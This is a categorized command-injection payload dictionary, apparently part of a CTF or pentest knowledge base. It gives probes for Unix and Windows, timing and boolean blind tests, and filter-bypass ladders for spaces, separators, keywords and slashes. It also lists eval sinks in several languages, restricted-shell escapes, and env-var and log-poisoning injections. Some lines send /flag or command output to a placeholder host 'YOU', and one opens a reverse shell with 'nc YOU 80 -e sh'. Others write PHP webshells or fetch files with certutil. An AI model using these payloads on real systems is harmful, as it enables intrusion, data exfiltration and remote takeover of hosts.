# Payload Dictionary — the categorized corpus

Every payload here is a CANDIDATE — a probe to run through the contract,
not a claim. Pick by observed constraint, not by order.

## 1. Identity probes — "did anything run?"

```
;id
|id
`id`
$(id)
;id;
%0aid
%0a id %0a
;id#
;id;#
||id
&&id
&id
%26id
;;id
;{id};
;${IFS}id
;id;
;echo$IFS$9$(id)
'a';id
"a";id
');id
");id
');id;//
");id;//
```

## 2. Windows identity probes

```
&whoami
&&whoami
|whoami
||whoami
%26whoami
%0awhoami
&hostname
&ipconfig
&ver
&dir
&echo%20P%COMPUTERNAME%S
&powershell -c whoami
&powershell -enc dwBoAG8AYQBtAGkA   # 'whoami' b64
&certutil -urlcache -split -f http://YOU/x %TEMP%\x
```

## 3. Output-into-response — the direct-channel reads

```
;cat /flag
;cat flag.txt
|cat /flag
`cat /flag`
$(cat /flag)
;cat${IFS}/flag
;cat</flag
;{cat,/flag}
;/bin/cat${IFS}/flag
;cat$IFS$9/flag
;cat%20/flag
%0acat /flag
;cat flag*
;/???/cat${IFS}/????
;cat /f*
;cat${IFS}$PWD/f*
```

## 4. Blind — timing

```
;sleep 5
|sleep 5
`sleep 5`
$(sleep 5)
;sleep${IFS}5
;sleep+5
;sleep$IFS$95
%0asleep 5
;sleep 5#
;sleep 5;#
;sleep$((5))
;sleep$((0x5))
;sleep$[5]
;sleep{IFS}5
;sleep\$IFS5
&&sleep 5
||sleep 5
&timeout 5
&timeout /t 5
&ping -n 5 127.0.0.1
&powershell -c sleep 5
&powershell Start-Sleep 5
```

## 5. Blind — OOB

```
;curl http://YOU/
;curl$IFShttp://YOU/
;wget http://YOU/
;wget -qO- http://YOU/
;nslookup x.YOU
;dig x.YOU
;host x.YOU
;ping -c1 x.YOU
;nc YOU 80 -e sh       # reverse, needs listener
;curl http://YOU/$(id|base64|tr -d '\n')
;curl http://YOU/`id|base64`
;wget --post-data="$(id)" http://YOU/
;curl -F "f=@/flag" http://YOU/
;curl http://YOU/$(cat /flag|xxd -p)
;nslookup $(cat /flag|base64|tr -d '\n').YOU
;python -c 'import urllib.request;urllib.request.urlopen("http://YOU/"+open("/flag").read())'
;php -r 'file_get_contents("http://YOU/".file_get_contents("/flag"));'
```

## 6. Blind — file-write-then-fetch

```
;echo x>/tmp/o
;echo x>/tmp/o;cat /tmp/o
;id>/tmp/o
;cat /flag>/tmp/o
;cat /flag>/var/www/html/o.txt    # webroot
;cp /flag /tmp/o
;echo<?php system($_GET[0]);?>/tmp/x.php    # webshell if php
```

## 7. Blind — error-channel

```
;$(cat /flag)          # "flag{...}: not found" — the error carries it
;`cat /flag`
;x$(cat /flag)         # if command-not-found reflects the arg
```

## 8. Blind — boolean/differential

```
;sleep$([ -f /flag ]&&echo 5)
;sleep$([ -f /flag ]&&echo 5||echo 0)
;if[ -f /flag ];then sleep 5;fi
;[ -f /flag ]&&sleep 5
;sleep$((`cat /flag|wc -c`))
```

## 9. Space-blocked — the IFS ladder

```
${IFS}
$IFS$9
$IFS$1
${IFS}${PATH:0:1}
%09
%09id
;{cat,/flag}
;{cat,/flag,}
;cat</flag
;cat${IFS}/flag
;cat$IFS$9/flag
;cat\$IFS$9/flag
a=cat;b=/flag;$a$b
```

## 10. `;`-blocked — the separator ladder

```
%0a
%0d
%0d%0a
|id
||id
&&id
&id
`id`
$(id)
{id}
>${IFS}id         # redirect-based
;{}id
```

## 11. Letter/keyword-filtered

```
c'a't
c"a"t
c\at
c$@at
ca$@t
$'c''a''t'
$(echo Y2F0 | base64 -d)
${PATH:0:1}???/${0:0:1}*t
/???/c?t
/???/cat
f=/bin/cat;$f /flag
x=ca;$x"t"
c$(echo YQ==|base64 -d)t
$(tr '[A-Z]' '[a-z]'<<<CAT)
```

## 12. `/`-blocked

```
${HOME:0:1}
${PWD:0:1}
${0:0:1}
${PATH:0:1}
${SHELL:0:1}
cd flagdir;cat flag
${PWD%%/*}          # first path segment
```

## 13. `.`-blocked

```
/flag*
/f*l*a*g*
/????
$(ls /|grep flag)
```

## 14. Quoting breakouts — `quoting.md` for the taxonomy

```
';id'
';id;'
';id;'
";id"
");id
');id
';id;//
';id--
';id;#
`id`
`id`;
$(id);
';`id`
');`id`
';$(id)
```

## 15. Arg-injection — flag-form, `argument-injection.md`

```
--upload-pack=id
-c core.sshCommand=id
--config=id
-oProxyCommand=id
--checkpoint-action=exec=id
-exec=id
-e=id
-T=id
--output=/tmp/x
--post-file=/flag
--include-from=/flag
--script=id
--load=id
-f/etc/passwd
```

## 16. Evaluator — `eval-injection.md`

```
php:    system('id')  shell_exec('id')  `id`  passthru('id')
        assert('system("id")')  eval('system("id");')
        call_user_func('system','id')
        preg_replace('/x/e','id','x')  # old php
python: __import__('os').system('id')
        __import__('os').popen('id').read()
        eval('__import__("os").system("id")')
        exec('import os;os.system("id")')
        globals()['__builtins__']['eval']('__import__("os").system("id")')
node:   require('child_process').execSync('id')
        require('child_process').execSync('id').toString()
        process.mainModule.require('child_process').execSync('id')
        global.process.mainModule.require('child_process').execSync('id')
        require('fs').writeFileSync('/tmp/x',require('child_process').execSync('id'))
ruby:   `id`  %x{id}  system('id')  exec('id')  IO.popen('id').read
        eval('system("id")')  Kernel.system('id')
perl:   `id`  qx{id}  system('id')  exec('id')  open(F,'id|')
java:   Runtime.getRuntime().exec('id')
        new ProcessBuilder('sh','-c','id').start()
bash:   eval 'id'  bash -c id  sh -c id  . /dev/stdin<<<$'id'
```

## 17. Second-order — the stored payloads

```
name=x;id          # stored, run later by admin/cron
comment=$(curl http://YOU/)
desc=`id`
title=|curl http://YOU/
```

## 18. Log-poison — `log-poisoning.md`

```
User-Agent: <?php system($_GET[0]);?>
User-Agent: <?=system($_GET[0])?>
User-Agent: <?=`id`?>
referer: <?php system($_GET[0]);?>
X-Forwarded-For: <?php system($_GET[0]);?>
```

## 19. Env-var-injection — `env-var-injection.md`

```
x;BASH_ENV=/tmp/x bash
x;ENV=/tmp/x sh
x;LD_PRELOAD=/tmp/x.so id
x;PROMPT_COMMAND=id bash
x;PS4='$(id)' bash -x
x;PYTHONSTARTUP=/tmp/x python
x;NODE_OPTIONS='--require /tmp/x' node
x;RUBYOPT='-r/tmp/x' ruby
x;PERL5OPT='-M/tmp/x' perl
```

## 20. Redirection — `redirection-tricks.md`

```
x> /tmp/o            # write
x>>/tmp/o            # append
x</flag              # read into stdin
x 2>/tmp/o           # stderr write
x|tee /tmp/o         # tee write
x > /var/www/html/o  # webroot write
```

## 21. Restricted-shell — `sandboxed-shells.md`/`restricted-shell.md`

```
vi -c ':!id'
less /etc/passwd     # then !id
man bash             # then !id
find . -exec sh -c id \;
find . -exec id \;
awk 'BEGIN{system("id")}'
awk 'BEGIN{"id"|getline x;print x}'
sed -e 'id' /etc/passwd
tar --checkpoint-action=exec='id'
tar --checkpoint=1 --checkpoint-action=exec=id -cf x x
zip x /etc/passwd -T --unzip-command='sh -c id'
ssh -oProxyCommand=id x
ssh -oLocalCommand=id x
git -c core.pager=id diff
git -c core.sshCommand=id fetch
nmap --script=id
ftp -n
   !id
gdb -q -ex '!id'
env BASH_ENV=/tmp/x bash
env SHELLOPTS=xtrace PS4='$(id)' bash
```

## 22. The `${IFS}`-family — expansion tricks — `variable-tricks.md`

```
${IFS}
$IFS
$IFS$9
$IFS$1
${IFS}${HOME:0:1}
${PATH:0:1}
${0:0:1}
${PWD:0:1}
${SHELL:0:1}
${HOME:0:1}${PWD:0:1}
${LS_COLORS:10:1}     # byte-fishing
${#}                  # length tricks
${!x}                 # indirection
${x/y/z}              # substitution
${x^}                 # case-fold
${x,,}                # lowercase
${x^^}                # uppercase
${x:1:1}              # substring
${x##*/}              # basename
${x%/*}               # dirname
${!x@}                # name expansion
${x@Q}                # quoted
${x@E}                # expanded
```

## 23. Wildcard/glob — `wildcard-globbing.md`

```
cat /f*
cat /?*
cat /flag*
cat *f*a*g*
cat ${IFS}/f*
/???/cat /f*l*g*
/bin/c?t /flag
/*/*at /flag
/???/cat${IFS}/????
ca? /flag
c*t /flag
```

## 24. Encoding — `encoding.md`

```
%3B            — ;
%26            — &
%7C            — |
%0A            — \n
%60            — `
%24            — $
%28            — (
%29            — )
%27            — '
%22            — "
%3E            — >
%3C            — <
%09            — tab
%25            — %
%u003B         — unicode ;
%ef%bc%9b      — fullwidth ;
%c0%bb         — overlong ;
%25%33%42      — double-encoded ;
${IFS:+;}      — expansion-packed ;
\x3b           — sh-$'..' escaped
\u003b         — unicode escape in some parsers
```

## 25. `:`-based data-URI / stream-scheme tricks

```
data:text/plain;base64,...
expect://id            # php expect wrapper
php://filter/read=...  # php filter — file-read-primitives
```

## 26. The "send it raw" control set — baseline / falsifier

```
x                      # bare — the baseline
x;                     # trailing ; — is the shell even reached?
x'                     # quote — does the quoting break?
x"                     # double quote
x|                     # pipe alone
x%0a                   # newline
x$(true)               # substitution that's a no-op
x`true`                # backtick no-op
x#                     # comment
x;#                    # separator+comment
x&&                    # and
x||                    # or
```

## 27. Multi-command sanity — which subset survives

```
x;id;hostname;uname -a
x&id&hostname
x%0aid%0ahostname
x`id;hostname`
x$(id;hostname)
x;id|hostname|uname -a
```

## 28. `exec`/`popen`/`system`-form payloads — `popen-system-exec.md`

The cmdi these emit once the code runs:

```
system('id')           # php — output to stdout
passthru('id')         # php — raw output
shell_exec('id')       # php — capture
`id`                   # php — backtick
exec('id', $o)         # php — last line
popen('id','r')        # php — stream
proc_open('id',...)    # php — full
pcntl_exec('/bin/sh',...)   # php — replace
os.system('id')        # python — stdout
os.popen('id').read()  # python — capture
subprocess.check_output('id',shell=True)
subprocess.run('id',shell=True,capture_output=True)
child_process.execSync('id')  # node
%x{id}                 # ruby
qx{id}                 # perl
open(F,'id|')          # perl
Runtime.getRuntime().exec('id')  # java
Process.Start('cmd','/c id')     # .net
```

## 29. The `$( )`-inside-`$( )` / nested — `inline-exec.md`

```
$(id;id)
$(id|id)
$($(echo id))
`id;id`
`id|id`
`id`id
```

## 30. The "everything blocked" — the last-resort table

```
${PATH:0:1}        # /
${HOME:0:1}        # /
~                  # home expansion
$0                 # script path
$* $@ $# $- $$ $?  # special vars
< file             # stdin
> file             # stdout-write
*                  # glob
?                  # single-char glob
[abc]              # class glob
{cmd,arg}          # brace
{cat,/flag}        # brace+comma
printf %s x        # format
$(<file)           # file-as-cmd
xargs < file       # stdin-split
tr A a < file      # stdin-filter
sort < file        # stdin-sort
```

## 31. The "need bytes not strings" — byte-level

```
$(printf '\x69\x64')        # id
$(printf '\x63\x61\x74')    # cat
$(echo 6964|xxd -r -p)
$(echo -e '\x69\x64')
${(S)s}                     # zsh split
$'\x69\x64'                 # ANSI-C quoting
$'\151\144'                 # octal
```

## 32. The "out of ideas" — reclassify candidates

If NOTHING above moves — the surface may be:

- argv-boundary execFile (no shell) → `argument-injection.md`
- evaluator not shell → `eval-injection.md`
- template engine → `web-ssti`
- no sink at all → park it, `knowledge/attempts/`
